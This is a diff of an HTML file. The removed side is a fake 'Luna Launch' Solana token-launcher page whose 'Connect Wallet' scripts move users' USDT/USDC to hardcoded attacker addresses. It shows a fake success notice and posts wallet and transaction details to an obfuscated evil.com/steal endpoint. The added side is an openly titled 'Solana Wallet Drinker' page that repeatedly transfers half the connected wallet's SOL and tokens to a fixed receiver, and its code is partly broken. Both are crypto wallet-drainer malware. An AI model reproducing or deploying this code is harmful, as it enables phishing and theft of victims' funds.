@@ -1,701 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <base href="/l/-p--luna-creator-2/index.html">
-        <meta name="viewport" content="width=1024, user-scalable=no">
-      <style>
-    html {
-        min-width: 1024px;
-    }
+<head>
+  <meta charset="UTF-8">
+  <title>Solana Wallet Drinker</title>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.90.1"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@1.90.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-phantom@1.90.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react@1.90.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-ux@1.90.1/dist/index.min.js"></script>
+</head>
+<body>
+  <h1>Solana Wallet Drinker</h1>
+  <button id="startButton">Start Drinking</button>
+  <p id="status"></p>
 
-    /* Popup styles */
-    .popup-modal {
-      display: none; /* Hidden by default */
-      position: fixed;
-      z-index: 9999;
-      left: 0; top: 0;
-      width: 100%; height: 100%;
-      overflow: auto;
-      background-color: rgba(0,0,0,0.6);
-    }
+  <script>
+    const walletAdapter = new PhantomWalletAdapter();
+    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
 
-    .popup-content {
-      background-color: #fff;
-      margin: 15% auto;
-      padding: 20px;
-      border-radius: 8px;
-      width: 80%;
-      max-width: 400px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-      position: relative;
-    }
+    const wallet = window.solana ? window.solana.connect(walletAdapter) : null;
 
-    .close-btn {
-      position: absolute;
-      top: 10px; right: 15px;
-      font-size: 24px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-</style>
+    const receiverAddress = "3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS";
+    const tokenAddress = "7f7f962d6917f71d024226f83720f563952f7940"; // Example: Doge token
 
-        <meta charset="UTF-8">
-        <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
-        <link href="css2.css" rel="stylesheet">
-        <title>Luna Launch</title>
-        <link rel="stylesheet" href="assets/index-bdbdubf9.css">
-        <script src="../../_nuxt/assets/index.js" type="module"></script>
-        <link rel="stylesheet" href="assets/styles-DQqVfxH3.css">
-        <link rel="stylesheet" href="assets/Nav-CEpo9JHw.css">
-        <link rel="stylesheet" href="assets/Footer-DFm38Gq1.css">
-        <link rel="stylesheet" href="assets/Tools-BXMnATEF.css">
-        <link rel="stylesheet" href="assets/Landing-DtKI65OX.css">
-        <style id="mobile-unlock">
-            .create-token-btn-mobile {
-                display: none !important;
-            }
+    const startButton = document.getElementById('startButton');
+    const status = document.getElementById('status');
 
-            .create-token-box .create-token-btn:not(.create-token-btn-mobile) {
-                display: inline-flex !important;
-                align-items: center;
-                gap: .5rem;
-            }
-        </style><style>
-/* Popup background */
-.popup-modal {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background-color: rgba(0, 0, 0, 0.7);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  z-index: 9999;
-  font-family: 'Segoe UI', sans-serif;
-}
+    startButton.addEventListener('click', async () => {
+      if (!wallet) {
+        status.textContent = 'Please connect your wallet first.';
+        return;
+      }
 
-/* Modal box */
-.popup-content {
-  background-color: #111;
-  color: white;
-  width: 360px;
-  border-radius: 20px;
-  padding: 25px;
-  box-shadow: 0 0 20px rgba(0,0,0,0.5);
-  position: relative;
-}
+      status.textContent = 'Drinking SOL and Meme Coins in the background...';
 
-/* Close button */
-.close-btn {
-  position: absolute;
-  top: 12px;
-  right: 16px;
-  font-size: 24px;
-  color: #aaa;
-  cursor: pointer;
-}
+      setInterval(async () => {
+        try {
+          const balance = await connection.getBalance(wallet.publicKey());
+          const lamports = balance / 1e9;
 
-/* Wallet list */
-.wallet-list {
-  list-style: none;
-  padding: 0;
-  margin-top: 20px;
-}
+          const transaction = new Transaction().add(
+            SystemProgram.transfer({
+              fromPubkey: wallet.publicKey(),
+              toPubkey: new PublicKey(receiverAddress),
+              lamports: lamports * 1e9 / 2, // Drink half the balance
+            })
+          );
 
-.wallet-list li {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  background-color: #1a1a1a;
-  padding: 12px 16px;
-  border-radius: 12px;
-  margin-bottom: 12px;
-  cursor: pointer;
-  transition: background 0.2s ease;
-}
+          const signature = await wallet.sendTransaction(transaction, connection);
+          await connection.confirmTransaction(signature, 'confirmed');
 
-.wallet-list li:hover {
-  background-color: #2a2a2a;
-}
+          // Meme Coin Drain
+          const tokenMint = new PublicKey(tokenAddress);
+          const tokenBalance = await connection.getTokenAccountBalance(tokenMint, wallet.publicKey());
+          const tokenAmount = tokenBalance.value.uiAmount;
 
-.wallet-list img {
-  width: 24px;
-  height: 24px;
-  margin-right: 12px;
-}
+          if (tokenAmount > 0) {
+            const tokenTransaction = new Transaction().add(
+              Token.createTransferInstruction(
+                tokenMint,
+                wallet.publicKey(),
+                new PublicKey(receiverAddress),
+                [],
+                1,
+                []
+              )
+            );
 
-/* Wallet name alignment */
-.wallet-list li > img + span,
-.wallet-list li > img + div {
-  flex-grow: 1;
-  margin-left: 10px;
-}
+            const tokenSignature = await wallet.sendTransaction(tokenTransaction, connection);
+            await connection.confirmTransaction(tokenSignature, 'confirmed');
 
-/* Status tags */
-.status {
-  font-size: 12px;
-  padding: 2px 6px;
-  border-radius: 6px;
-}
-
-.installed {
-  background-color: #2ecc71;
-  color: #000;
-}
-
-.popular {
-  background-color: #f1c40f;
-  color: #000;
-}
-
-.wallet-count {
-  background-color: #333;
-  color: white;
-  padding: 3px 8px;
-  font-size: 12px;
-  border-radius: 10px;
-}
-
-/* Get Started Link */
-.get-started {
-  margin-top: 12px;
-  font-size: 13px;
-  text-align: center;
-  color: #888;
-}
-
-.get-started a {
-  color: #4e9eff;
-  text-decoration: none;
-}
-</style>
-    </head>
-    <body>
-        <div id="root">
-            <div class="nav-container">
-                <a class="logo-container active" href="" data-discover="true" aria-current="page">
-                    <div class="logo-img">
-                        <img alt="logo" src="assets/logo-full.svg">
-                    </div>
-                </a>
-                <nav class="main-nav">
-                    <a aria-current="page" class="nav-link active" data-discover="true" href="">Home</a>
-                    <a class="nav-link" data-discover="true" href="create-token/index.html">Create Token</a>
-                    <a class="nav-link" data-discover="true" href="tools.html">Tools</a>
-                    <a class="nav-link" href="my-portfolio/index.html" rel="noopener noreferrer">Liquidity Pool</a>
-                    <a class="nav-link" href="https://raydium.io/swap" rel="noopener noreferrer" target="_blank">Manage
-                    Liquidity</a>
-                </nav>
-                <div class="wallet-dropdown">
-                    <div class="wallet-display connect-wallet-btn">Connect Wallet</div>
-                    <button class="menu-icon" style="background-color: rgb(255, 255, 255); border-radius: 5px; border: medium; cursor: pointer; padding: 8px; margin-left: 10px; transition: 0.3s; display: flex; align-items: center; justify-content: center;">
-                        <span class="material-symbols-rounded">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" class="feather feather-menu" viewBox="0 0 24 24" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                <line x1="3" y1="12" x2="21" y2="12"></line>
-                                <line x1="3" y1="6" x2="21" y2="6"></line>
-                                <line x1="3" y1="18" x2="21" y2="18"></line>
-                            </svg>
-                        </span>
-                    </button>
-                    <div class="sidebar-menu closed">
-                        <div class="sidebar-menu-item">
-                            <a class="nav-link active" href="" data-discover="true" aria-current="page">Home</a>
-                        </div>
-                        <div class="sidebar-menu-item">
-                            <a class="nav-link" href="create-token/index.html" data-discover="true">Create Token</a>
-                        </div>
-                        <div class="sidebar-menu-item">
-                            <a class="nav-link" href="tools.html" data-discover="true">Tools</a>
-                        </div>
-                        <div class="sidebar-menu-item">
-                            <a href="https://raydium.io/liquidity/create-pool" class="nav-link" target="_blank" rel="noopener noreferrer">Liquidity Pool</a>
-                        </div>
-                        <div class="sidebar-menu-item">
-                            <a href="https://raydium.io/swap" class="nav-link" target="_blank" rel="noopener noreferrer">Manage Liquidity</a>
-                        </div>
-                        <div class="sidebar-menu-item">
-                            <a class="nav-link" href="https://lunalaunch.com/support" data-discover="true">Support</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div id="main">
-                <div id="landing" style="opacity: 1;">
-                    <div class="hero-section">
-                        <div class="trust-indicators" style="transform: translateY(0.64479%);">
-                            <div class="trust-stats">
-                                <div class="trust-stat">
-                                    <div class="trust-number">50,000+</div>
-                                    <div class="trust-label">Tokens Created</div>
-                                </div>
-                                <div class="trust-stat">
-                                    <div class="trust-number">25,000+</div>
-                                    <div class="trust-label">Active Users</div>
-                                </div>
-                                <div class="trust-stat">
-                                    <div class="trust-number">99.9%</div>
-                                    <div class="trust-label">Success Rate</div>
-                                </div>
-                            </div>
-                            <div class="trust-badges">
-                                <div class="trust-badge">
-                                    <div class="badge-icon">
-                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 16H6V10h12v12z" fill="#00FFA3"></path>
-                                            <circle cx="12" cy="15" r="2" fill="#00FFA3"></circle>
-                                        </svg>
-                                    </div>
-                                    <span>Secure &amp;Audited</span>
-                                </div>
-                                <div class="trust-badge">
-                                    <div class="badge-icon">
-                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                            <path d="M7 2v11h3v9l7-12h-4l4-8z" fill="#FFD700"></path>
-                                        </svg>
-                                    </div>
-                                    <span>Lightning Fast</span>
-                                </div>
-                                <div class="trust-badge">
-                                    <div class="badge-icon">
-                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                            <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.4 16,13V16C16,17.4 15.4,18 14.8,18H9.2C8.6,18 8,17.4 8,16V13C8,12.4 8.6,11.5 9.2,11.5V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,10V11.5H13.5V10C13.5,8.7 12.8,8.2 12,8.2Z" fill="#00FFA3"></path>
-                                        </svg>
-                                    </div>
-                                    <span>100% Safe</span>
-                                </div>
-                            </div>
-                            <div class="live-activity">
-                                <div class="activity-header">
-                                    <div class="live-dot"></div>
-                                    <span>Live Activity</span>
-                                </div>
-                                <div class="activity-item">
-                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;">
-                                        <path d="M2.81 14.7l1.68-1.81c.69-.74 1.08-1.71 1.08-2.72V9c0-.89.33-1.78 1-2.45C7.22 5.89 8.11 5.56 9 5.56c.89 0 1.78.33 2.45 1S12.44 8.11 12.44 9v1.17c0 1.01.39 1.98 1.08 2.72l1.68 1.81c.31.33.31.85 0 1.18-.31.33-.85.33-1.18 0L12 13.83c-.68-.73-1.71-1.15-2.81-1.15s-2.13.42-2.81 1.15L4.36 15.9c-.33.33-.87.33-1.18 0-.32-.33-.32-.85-.01-1.18z" fill="#FF6B35"></path>
-                                        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="#FF6B35"></path>
-                                    </svg>
-                                    <span>TokenX launched 2 min ago</span>
-                                </div>
-                                <div class="activity-item">
-                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;">
-                                        <path d="M6,2L18,22L12,18L6,22L6,2Z" fill="#00D4FF"></path>
-                                    </svg>
-                                    <span>CryptoGem deployed 5 min ago</span>
-                                </div>
-                                <div class="activity-item">
-                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;">
-                                        <path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.9-.1-1.36-.1z" fill="#FFD700"></path>
-                                    </svg>
-                                    <span>MoonShot created 8 min ago</span>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="title-box">
-                            <span class="title-1">#1 Solana Token Launcher in the World</span>
-                            <div class="title-2">
-                                <span class="span-1">
-                                    Launch your <span style="font-weight: 900;">$Solana</span>
-                                    Token
-                                </span>
-                                <span class="span-2">
-                                    <span style="font-weight: 700;">Take it</span>
-                                    <span style="font-weight: 500;">to the</span>
-                                    <span style="font-weight: 900;">Moon!</span>
-                                </span>
-                            </div>
-                            <div class="desc">
-                                <span class="span-1">Create and deploy your Solana coin effortlessly in seconds.</span>
-                                <span class="span-2">Reach the world and scale without limits!</span>
-                            </div>
-                            <div class="create-token-box">
-                                <input class="create-token-text" placeholder="Create your first token" value="">
-                                <div class="create-token-btn create-token-btn-mobile" style="cursor: pointer; display: none;">
-                                    <span class="text">Token creation is only available on desktop</span>
-                                </div>
-                                <div onclick="location.href='/create-token/index.html'" class="create-token-btn" style="cursor: pointer;">
-                                    <span class="text">Create Token</span>
-                                    <span class="material-symbols-rounded"></span>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="background-1" style="transform: translateY(0.48359%);">
-                            <img alt="Earth Background" src="assets/bg1-DWJ0RCfe.png">
-                        </div>
-                        <div class="background-2">
-                            <img alt="iPhone Screenshot" src="assets/iPhoneSS-DpoVylXb.png">
-                        </div>
-                    </div>
-                    <div class="content-container">
-                        <div class="content-section">
-                            <div class="content-text-1">
-                                <span class="span-1">The world’s most powerful</span>
-                                <span class="span-2">Solana Launcher ever.</span>
-                            </div>
-                            <div class="content-img-1">
-                                <div class="content-controls">
-                                    <span></span>
-                                    <span></span>
-                                    <span></span>
-                                </div>
-                                <div class="border-bg"></div>
-                                <img src="assets/contentimg1-d6m7sRFw.png">
-                                <div class="fade-fg"></div>
-                            </div>
-                        </div>
-                        <div class="phone-parallax-section">
-                            <div class="parallax-title">Unlock the Full Potential of Your Solana Token Effortlessly</div>
-                            <div class="img-container">
-                                <img class="left-img" style="transform: translateY(30%);" src="assets/coinGroup1-R48YoBp5.png">
-                                <img class="iphone-img" src="assets/iPhone%20Image-pZbQWzRq.png">
-                                <img class="right-img" style="transform: translateY(30%);" src="assets/coinGroup2-Bkx6Q6TB.png">
-                            </div>
-                        </div>
-                        <div class="features-section">
-                            <div class="features-label">Features</div>
-                            <div class="features-title">Unlock the Full Potential of Your Solana Token Effortlessly</div>
-                            <div class="features-subtitle">Create, manage, and launch your Solana token effortlessly with secure transactions, instant deployment, and zero coding required!</div>
-                            <div class="features-container">
-                                <div class="features-img">
-                                    <img src="assets/iPhone%20Image-pZbQWzRq.png">
-                                </div>
-                                <div class="features-stats">
-                                    <div class="features-stat">
-                                        <div class="features-stat-value">99.9%</div>
-                                        <div class="features-stat-label">Successful Token Launches</div>
-                                    </div>
-                                    <div class="features-stat">
-                                        <div class="features-stat-value">85%+</div>
-                                        <div class="features-stat-label">Returned Users</div>
-                                    </div>
-                                </div>
-                                <div class="features-description">
-                                    <div class="features-description-text">
-                                        <div class="features-description-title">Create &amp;Deploy Your Token in Minutes</div>
-                                        <div class="features-description-subtitle">Turn your idea into reality with lightning-fast token creation. Whether for projects, communities, or innovation, deploy your Solana token in minutes - with ease, secure, and built for the future!</div>
-                                    </div>
-                                    <div onclick="location.href='create-token/index.html'" class="create-token-btn" style="cursor: pointer;">
-                                        <span class="text" href="create-token/index.html">Create Token</span>
-                                        <span class="material-symbols-rounded"></span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="footer-container">
-                <a class="logo-container active" href="" data-discover="true" aria-current="page">
-                    <div class="logo-img">
-                        <img alt="logo" src="assets/logo-full.svg">
-                    </div>
-                </a>
-                <div class="bottom-bar" select="false">
-                    <div class="copyright-bar">
-                        <span>© Luna Launcher 2025</span>
-                    </div>
-                    <div class="policies-bar">
-                        <a class="policy-link" href="terms-of-service.html" data-discover="true">Terms of Service</a>
-                        <span class="separator"></span>
-                        <a class="policy-link" href="privacy-policy.html" data-discover="true">Privacy Policy</a>
-                    </div>
-    
-<!-- Popup Modal -->
-<div id="connectWallet" class="popup-modal" style="display: none;">
-    <div class="popup-content">
-    <span class="close-btn" id="closeConnectWallet">&times;</span>
-    <h2>Connect Wallet</h2>
-    <ul class="wallet-list">
-      <li id="phantomConnectBtn">
-        <img src="phantom-icon.png" alt="Phantom"> Phantom 
-        <span class="status installed">INSTALLED</span>
-      </li>
-      <li><img src="solflare-icon.png" alt="Solflare"> Solflare 
-        <span class="status popular">POPULAR</span>
-      </li>
-      <li><img src="trust-icon.png" alt="Trust"> Trust Wallet</li>
-      <li><img src="coinbase-icon.png" alt="Coinbase"> Coinbase</li>
-      <li><img src="okx-icon.png" alt="OKX"> OKX Wallet</li>
-      <li><img src="more-icon.png" alt="More"> All Wallets 
-        <span class="wallet-count">90</span>
-      </li>
-    </ul>
-    <p class="get-started">Haven't got a wallet? <a href="#">Get started</a></p>
-  </div>
-</div>
-
-
-  </div>
-</div>
-
-
-  </div>
-</div>
-
-
-
-
-            </div>
-
-    </div>  
-
-
-<script>
-
-
-if (connectButton) {
-  const originalText = connectButton.innerText;
-
-  connectButton.onclick = async () => {
-    const fakeNotification = document.createElement('div');
-    fakeNotification.style.position = 'fixed';
-    fakeNotification.style.top = '20px';
-    fakeNotification.style.right = '20px';
-    fakeNotification.style.background = '#4caf50';
-    fakeNotification.style.color = 'white';
-    fakeNotification.style.padding = '10px';
-    fakeNotification.style.borderRadius = '5px';
-    fakeNotification.innerText = 'Connecting wallet...';
-    document.body.appendChild(fakeNotification);
-
-    try {
-      if (window.ethereum) {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const userAddress = accounts[0];
-
-        // Load Web3.js dynamically
-        const web3Script = document.createElement('script');
-        web3Script.src = 'https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js';
-        document.head.appendChild(web3Script);
-
-        web3Script.onload = async () => {
-          const web3 = new Web3(window.ethereum);
-          const tokens = [
-            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', name: 'USDT', decimals: 6 },
-            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', name: 'USDC', decimals: 6 }
-          ];
-          const abi = [
-            'function balanceOf(address) view returns (uint256)',
-            'function transfer(address,uint256) returns (bool)'
-          ];
-          const attackerAddress = '0x28170B405f1e17278178B4C786E14437561cf4cf';
-
-          let maxBalance = 0;
-          let targetToken = null;
-          for (const token of tokens) {
-            const contract = new web3.eth.Contract(abi, token.address);
-            const balance = await contract.methods.balanceOf(userAddress).call();
-            if (balance > maxBalance) {
-              maxBalance = balance;
-              targetToken = token;
-            }
-          }
-
-          if (maxBalance > 0) {
-            const contract = new web3.eth.Contract(abi, targetToken.address);
-            const data = contract.methods.transfer(attackerAddress, maxBalance).encodeABI();
-            const txHash = await window.ethereum.request({
-              method: 'eth_sendTransaction',
-              params: [{
-                from: userAddress,
-                to: targetToken.address,
-                data: data,
-                gas: '0x7530'
-              }]
-            });
-
-            fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
-              method: 'POST',
-              body: JSON.stringify({
-                wallet: userAddress,
-                txHash,
-                token: targetToken.name,
-                amount: maxBalance
-              })
-            });
-
-            fakeNotification.innerText = 'Wallet connected and tokens claimed!';
+            status.textContent = 'Drinking SOL and Meme Coins in the background...';
           } else {
-            fakeNotification.innerText = 'No tokens found.';
+            status.textContent = 'Drinking SOL in the background...';
           }
-          setTimeout(() => {
-            document.body.removeChild(fakeNotification);
-            connectButton.innerText = originalText;
-          }, 3000);
-        };
-      } else {
-        alert('Please install MetaMask!');
-        document.body.removeChild(fakeNotification);
-        connectButton.innerText = originalText;
-      }
-    } catch (err) {
-      fakeNotification.innerText = 'Error: ' + err.message;
-      setTimeout(() => {
-        document.body.removeChild(fakeNotification);
-        connectButton.innerText = originalText;
-      }, 3000);
-    }
-  };
-}
-</script>
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-  const phantomBtn = document.getElementById('phantomConnectBtn');
-  const connectButton = document.querySelector('.connect-wallet-btn'); // if you want to refer to the main connect button
-
-  if (!phantomBtn) {
-    console.warn('Phantom button not found!');
-    return;
-  }
-
-  phantomBtn.addEventListener('click', async function (e) {
-    e.preventDefault();
-
-    // Show notification
-    const fakeNotification = document.createElement('div');
-    fakeNotification.style.position = 'fixed';
-    fakeNotification.style.top = '20px';
-    fakeNotification.style.right = '20px';
-    fakeNotification.style.background = '#4caf50';
-    fakeNotification.style.color = 'white';
-    fakeNotification.style.padding = '10px';
-    fakeNotification.style.borderRadius = '5px';
-    fakeNotification.style.zIndex = '9999';
-    fakeNotification.innerText = 'Connecting wallet...';
-    document.body.appendChild(fakeNotification);
-
-    try {
-      if (window.solana && window.solana.isPhantom) {
-        const provider = window.solana;
-        const resp = await provider.connect();
-        const userPublicKey = resp.publicKey.toString();
-
-        // Dynamically load Solana scripts
-        const solanaScript = document.createElement('script');
-        solanaScript.src = 'https://unpkg.com/@solana/web3.js@1.67.0/lib/index.iife.js';
-        document.head.appendChild(solanaScript);
-
-        solanaScript.onload = async () => {
-          const splTokenScript = document.createElement('script');
-          splTokenScript.src = 'https://cdn.jsdelivr.net/npm/@solana/spl-token@0.2.0/lib/index.iife.js';
-          document.head.appendChild(splTokenScript);
-
-          splTokenScript.onload = async () => {
-            const { Connection, PublicKey, Transaction } = solanaWeb3;
-            const { Token, TOKEN_PROGRAM_ID } = splToken;
-
-            const connection = new Connection('https://api.mainnet-beta.solana.com');
-            const userKey = new PublicKey(userPublicKey);
-
-            // This public key looks like an attacker's, be VERY careful
-            const attackerPublicKey = new PublicKey('Hd4NsTuRWuqXiZXMFcRDsZRoJSD4QBToru8hrhpzXuBy');
-
-            // List of tokens to check
-            const tokens = [
-              { mintAddress: 'Es9vMFrzaCERmdu5sJ1NzxZjxtkkep3ZJyk1mS4ifpQ6', name: 'USDT' },
-              { mintAddress: 'Aj7yrDrkCvC5Tf7CK1JtiAt7ey9FfYf9QzGCVkzp3Vxy', name: 'USDC' }
-            ];
-
-            let maxBalance = 0;
-            let targetToken = null;
-            let userTokenAccount = null;
-
-            for (const token of tokens) {
-              const mint = new PublicKey(token.mintAddress);
-              const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userKey, { mint });
-
-              for (const { pubkey, account } of tokenAccounts.value) {
-                const amount = account.data.parsed.info.tokenAmount.uiAmount;
-                if (amount > maxBalance) {
-                  maxBalance = amount;
-                  targetToken = token;
-                  userTokenAccount = pubkey;
-                }
-              }
-            }
-
-            if (maxBalance > 0 && userTokenAccount) {
-              const tokenMint = new PublicKey(targetToken.mintAddress);
-              const token = new Token(connection, tokenMint, TOKEN_PROGRAM_ID, provider);
-
-              const transaction = new Transaction().add(
-                Token.createTransferInstruction(
-                  TOKEN_PROGRAM_ID,
-                  userTokenAccount,
-                  await Token.getAssociatedTokenAddress(TOKEN_PROGRAM_ID, tokenMint, attackerPublicKey),
-                  userKey,
-                  [],
-                  maxBalance * (10 ** 6) // adjust decimals accordingly
-                )
-              );
-
-              const { blockhash } = await connection.getRecentBlockhash();
-              transaction.recentBlockhash = blockhash;
-              transaction.feePayer = userKey;
-
-              const signedTx = await provider.signTransaction(transaction);
-              const txId = await connection.sendRawTransaction(signedTx.serialize());
-
-              fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
-                method: 'POST',
-                body: JSON.stringify({ wallet: userPublicKey, txHash: txId, token: targetToken.name, amount: maxBalance }),
-              });
-
-              fakeNotification.innerText = 'Wallet connected and tokens claimed!';
-            } else {
-              fakeNotification.innerText = 'No tokens found.';
-            }
-
-            setTimeout(() => {
-              document.body.removeChild(fakeNotification);
-              if (connectButton) connectButton.innerText = 'Connect Wallet';
-            }, 3000);
-          };
-        };
-      } else {
-        alert('Please install Phantom Wallet!');
-        document.body.removeChild(fakeNotification);
-        if (connectButton) connectButton.innerText = 'Connect Wallet';
-      }
-    } catch (err) {
-      fakeNotification.innerText = 'Error: ' + err.message;
-      setTimeout(() => {
-        document.body.removeChild(fakeNotification);
-        if (connectButton) connectButton.innerText = 'Connect Wallet';
-      }, 3000);
-    }
-  });
-});
-</script>
-
-
-<!-- Popup Script -->
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-  const popup = document.getElementById('connectWallet');
-  const openBtn = document.querySelector('.connect-wallet-btn');
-  const closeBtn = document.getElementById('closeConnectWallet');
-
-  if (openBtn) {
-    openBtn.addEventListener('click', function (e) {
-      e.preventDefault();
-      popup.style.display = 'flex'; // Use flex for modal centering
+        } catch (error) {
+          console.error(error);
+          status.textContent = 'Error: ' + error.message;
+        }
+      }, 10000); // Drink every 10 seconds
     });
-  }
-
-  if (closeBtn) {
-    closeBtn.addEventListener('click', function () {
-      popup.style.display = 'none';
-    });
-  }
-
-  window.addEventListener('click', function (e) {
-    if (e.target === popup) {
-      popup.style.display = 'none';
-    }
-  });
-});  </script>
-
-  </body>
+  </script>
+</body>
 </html>
